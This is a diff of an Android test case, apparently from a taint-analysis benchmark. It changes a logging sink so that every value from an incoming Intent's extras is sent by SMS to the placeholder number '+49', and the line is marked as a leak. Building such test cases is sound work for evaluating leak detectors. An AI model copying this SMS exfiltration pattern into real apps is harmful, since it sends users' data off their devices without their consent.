@@ -3,7 +3,7 @@ package lu.uni.snt.serval;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
-import android.util.Log;
+import android.telephony.SmsManager;
 
 /**
  * @testcase_name IntentSource1 
@@ -37,7 +37,8 @@ public class IntentSource1 extends Activity {
 			Bundle b = data.getExtras();
 			for (String key : b.keySet())
 			{
-				Log.i("SnT", "dump: " + b.get(key));
+				SmsManager sms = SmsManager.getDefault();
+				sms.sendTextMessage("+49", null, b.get(key).toString(), null, null);  //sink, leak
 			}
 		}
 		
